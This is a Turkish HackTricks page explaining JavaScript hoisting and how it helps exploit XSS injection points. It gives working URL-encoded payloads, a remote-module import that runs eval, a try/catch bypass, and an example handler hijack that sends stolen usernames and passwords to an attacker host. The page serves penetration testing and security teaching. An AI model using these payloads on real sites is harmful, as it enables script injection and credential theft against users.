# JS Hoisting

{{#include ../../banners/hacktricks-training.md}}

## Temel Bilgiler

JavaScript dilinde, değişkenlerin, fonksiyonların, sınıfların veya import'ların bildirimlerinin kod çalıştırılmadan önce kapsamlarının en üstüne kavramsal olarak taşındığı **Hoisting** olarak bilinen bir mekanizma vardır. Bu süreç, script'i birden fazla geçişte işleyen JavaScript engine'i tarafından otomatik olarak gerçekleştirilir.

İlk geçiş sırasında engine, sözdizimi hatalarını kontrol etmek için kodu parse eder ve onu bir abstract syntax tree'ye dönüştürür. Bu aşama hoisting'i içerir; belirli bildirimlerin yürütme bağlamının en üstüne taşındığı bir süreçtir. Parse aşaması başarılı olursa, yani sözdizimi hatası yoksa, script yürütülmeye başlanır.

Şunları anlamak önemlidir:

1. Script'in yürütülmesi için sözdizimi hatası içermemesi gerekir. Sözdizimi kurallarına kesinlikle uyulmalıdır.
2. Kodun script içindeki yerleşimi, hoisting nedeniyle yürütmeyi etkiler; bu yüzden yürütülen kod metinsel temsiliyle farklı olabilir.

#### Hoisting Türleri

MDN'e göre, JavaScript'te dört farklı hoisting türü vardır:

1. **Value Hoisting**: Bir değişkenin değeri, bildiriminin satırından önce kapsam içinde kullanılabilmesini sağlar.
2. **Declaration Hoisting**: Bir değişkenin bildirimi yapılmadan önce kapsam içinde referans verilmesine izin verir; `ReferenceError` oluşturmaz, ancak değişkenin değeri `undefined` olacaktır.
3. Bu tür, değişkenin gerçek bildirim satırından önce bildirimi nedeniyle kapsamdaki davranışı değiştirir.
4. Bildirimin yan etkileri, onu içeren geri kalan kod değerlendirilmeden önce gerçekleşir.

Detaylandıracak olursak, function deklarasyonları tip 1 hoisting davranışı gösterir. `var` anahtar kelimesi tip 2 davranışını sergiler. `let`, `const` ve `class`'ı içeren lexical deklarasyonlar tip 3 davranışını gösterir. Son olarak, `import` ifadeleri hem tip 1 hem de tip 4 davranışlarıyla hoist ediliyor olmaları bakımından benzersizdir.

## Senaryolar

Bu nedenle, eğer deklarasyonu yapılmamış bir nesne kullanıldıktan sonra **JS kodu enjekte edebileceğiniz** senaryolarınız varsa, sözdizimini **düzelterek** (kodunuzun hata fırlatmak yerine çalışması için) nesneyi bildirebilirsiniz:
```javascript
// The function vulnerableFunction is not defined
vulnerableFunction('test', '<INJECTION>');
// You can define it in your injection to execute JS
//Payload1: param='-alert(1)-'')%3b+function+vulnerableFunction(a,b){return+1}%3b
'-alert(1)-''); function vulnerableFunction(a,b){return 1};

//Payload2: param=test')%3bfunction+vulnerableFunction(a,b){return+1}%3balert(1)
test'); function vulnerableFunction(a,b){ return 1 };alert(1)
```

```javascript
// If a variable is not defined, you could define it in the injection
// In the following example var a is not defined
function myFunction(a,b){
return 1
};
myFunction(a, '<INJECTION>')

//Payload: param=test')%3b+var+a+%3d+1%3b+alert(1)%3b
test'); var a = 1; alert(1);
```

```javascript
// If an undeclared class is used, you cannot declare it AFTER being used
var variable = new unexploitableClass();
<INJECTION>
// But you can actually declare it as a function, being able to fix the syntax with something like:
function unexploitableClass() {
return 1;
}
alert(1);
```

```javascript
// Properties are not hoisted
// So the following examples where the 'cookie' attribute doesn´t exist
// cannot be fixed if you can only inject after that code:
test.cookie("leo", "INJECTION")
test[("cookie", "injection")]
```
## Diğer Senaryolar
```javascript
// Undeclared var accessing to an undeclared method
x.y(1,INJECTION)
// You can inject
alert(1));function x(){}//
// And execute the allert with (the alert is resolved before it's detected that the "y" is undefined
x.y(1,alert(1));function x(){}//)
```

```javascript
// Undeclared var accessing 2 nested undeclared method
x.y.z(1,INJECTION)
// You can inject
");import {x} from "https://example.com/module.js"//
// It will be executed
x.y.z("alert(1)");import {x} from "https://example.com/module.js"//")


// The imported module:
// module.js
var x = {
y: {
z: function(param) {
eval(param);
}
}
};

export { x };
```

```javascript
// In this final scenario from https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/
// It was injected the: let config;`-alert(1)`//`
// With the goal of making in the block the var config be empty, so the return is not executed
// And the same injection was replicated in the body URL to execute an alert

try {
if (config) {
return
}
// TODO handle missing config for: https://try-to-catch.glitch.me/"+`
let config
;`-alert(1)` //`+"
} catch {
fetch("/error", {
method: "POST",
body: {
url:
"https://try-to-catch.glitch.me/" +
`
let config;` -
alert(1) -
`//` +
"",
},
})
}
trigger()
```
### Hoisting ile hata yakalamayı atlatmak

Sink `try { x.y(...) } catch { ... }` ile sarıldığında, **ReferenceError** yürütmeyi payload'ınız çalışmadan önce durdurur. Eksik tanımlayıcıyı önceden bildirerek çağrının devam etmesini sağlayabilir ve enjekte ettiğiniz ifadenin önce çalışmasını sağlayabilirsiniz:
```javascript
// Original sink (x and y are undefined, but you control INJECT)
x.y(1,INJECT)

// Payload (ch4n3 2023) – hoist x so the call is parsed; use the first argument position for code exec
prompt()) ; function x(){} //
```
`function x(){}` değerlendirmeye alınmadan önce hoisted edilir, bu yüzden ayrıştırıcı `x.y(...)` üzerinde artık hata vermez; `prompt()` `y` çözülmeden önce çalışır, ardından kodunuz çalıştıktan sonra bir `TypeError` fırlatılır.

### const ile bir ismi kilitleyerek sonraki deklarasyonları engelleme

Eğer bir üst seviye `function foo(){...}` ayrıştırılmadan önce çalıştırma yapabiliyorsanız, aynı isimle bir leksikal bağlama bildirmek (ör. `const foo = ...`) daha sonraki function bildiriminin o tanımlayıcıyı yeniden bağlamasını engeller. Bu, sayfanın ilerleyen kısmında tanımlanan kritik handler'ların RXSS ile ele geçirilmesi için kötüye kullanılabilir:
```javascript
// Malicious code runs first (e.g., earlier inline <script>)
const DoLogin = () => {
const pwd  = Trim(FormInput.InputPassword.value)
const user = Trim(FormInput.InputUtente.value)
fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd))
}

// Later, the legitimate page tries to declare:
function DoLogin(){ /* ... */ } // cannot override the existing const binding
```
Notes
- Bu, yürütme sırasına ve global (üst seviye) kapsamına dayanır.
- Payload'iniz `eval()` içinde çalıştırılıyorsa, `eval` içindeki `const/let`'lerin blok kapsamlı olduğunu ve global bağlamlar oluşturmayacağını unutmayın. Gerçek bir global `const` oluşturmak için kodu içeren yeni bir `<script>` elementi enjekte edin.

### Dynamic import() with user-controlled specifiers

Server-side rendered uygulamalar bazen kullanıcı girdisini bileşenleri lazy-load etmek için `import()`'a iletir. `import-in-the-middle` gibi bir loader mevcutsa, specifier'dan wrapper modüller üretilir. Hoisted import değerlendirmesi, takip eden satırlar çalışmadan önce saldırgan kontrollü modülü getirir ve çalıştırır; bu da SSR bağlamlarında RCE'ye olanak tanır (bkz. CVE-2023-38704).

### Tooling

Güncel tarama araçları açıkça hoisting payload'ları eklemeye başladı. **KNOXSS v3.6.5** "JS Injection with Single Quotes Fixing ReferenceError - Object Hoisting" ve "Hoisting Override" test vakalarını listeler; bunu ReferenceError/TypeError atan RXSS context'lerine karşı çalıştırmak, hoist tabanlı gadget adaylarını hızlıca ortaya çıkarır.

## References

- [https://jlajara.gitlab.io/Javascript_Hoisting_in_XSS_Scenarios](https://jlajara.gitlab.io/Javascript_Hoisting_in_XSS_Scenarios)
- [https://developer.mozilla.org/en-US/docs/Glossary/Hoisting](https://developer.mozilla.org/en-US/docs/Glossary/Hoisting)
- [https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/](https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/)
- [From "Low-Impact" RXSS to Credential Stealer: A JS-in-JS Walkthrough](https://r3verii.github.io/bugbounty/2025/08/25/rxss-credential-stealer.html)
- [XSS Exception Bypass using Hoisting (ch4n3, 2023)](https://new-blog.ch4n3.kr/xss-exception-bypass-using-hoisting/)
- [KNOXSS coverage – hoisting override cases](https://knoxss.pro/?page_id=766)

{{#include ../../banners/hacktricks-training.md}}
